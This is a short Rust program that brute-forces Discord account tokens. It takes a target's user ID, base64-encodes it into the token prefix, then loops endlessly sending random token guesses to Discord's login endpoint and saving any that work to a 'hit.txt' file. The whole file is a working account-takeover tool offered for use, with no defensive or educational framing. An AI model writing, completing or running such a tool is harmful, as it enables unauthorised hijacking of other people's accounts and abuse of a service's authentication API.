use base64;
use rand::seq::SliceRandom;
use rand::thread_rng;
use reqwest::header::{HeaderMap, HeaderValue, AUTHORIZATION};
use reqwest::{Client, Response};
use std::fs::OpenOptions;
use std::io::{self, BufRead, Write};

#[tokio::main]
async fn main() {
    let mut id_to_token = String::new();
    println!("ID TO TOKEN --> ");
    io::stdin()
        .lock()
        .read_line(&mut id_to_token)
        .expect("Failed to read input");
    let id_to_token = base64::encode(id_to_token.trim().as_bytes());

    loop {
        let token = format!(
            "{}.{}",
            id_to_token,
            generate_random_string(4) + "." + &generate_random_string(25)
        );
        let client = Client::new();
        let login_url = "https://discordapp.com/api/v9/auth/login";
        let mut headers = HeaderMap::new();
        headers.insert(AUTHORIZATION, HeaderValue::from_str(&token).unwrap());

        let login = client.get(login_url).headers(headers).send().await;

        match login {
            Ok(response) => {
                if response.status().is_success() {
                    println!("\x1b[32m[+] VALID {}\x1b[0m", token);
                    let mut f = OpenOptions::new()
                        .create(true)
                        .append(true)
                        .open("hit.txt")
                        .expect("Failed to open file");
                    writeln!(f, "{}", token).expect("Failed to write to file");
                } else {
                    println!("\x1b[31m[-] INVALID {}\x1b[0m", token);
                }
            }
            Err(_) => {
                println!("\x1b[31m[-] INVALID {}\x1b[0m", token);
            }
        }
        println!("");
    }
}

fn generate_random_string(length: usize) -> String {
    let mut rng = thread_rng();
    let characters: Vec<char> = (0..26)
        .map(|i| (i + b'a') as char)
        .chain((0..26).map(|i| (i + b'A') as char))
        .chain((0..10).map(|i| (i + b'0') as char))
        .collect();
    (0..length)
        .map(|_| characters.choose(&mut rng).unwrap())
        .collect()
}
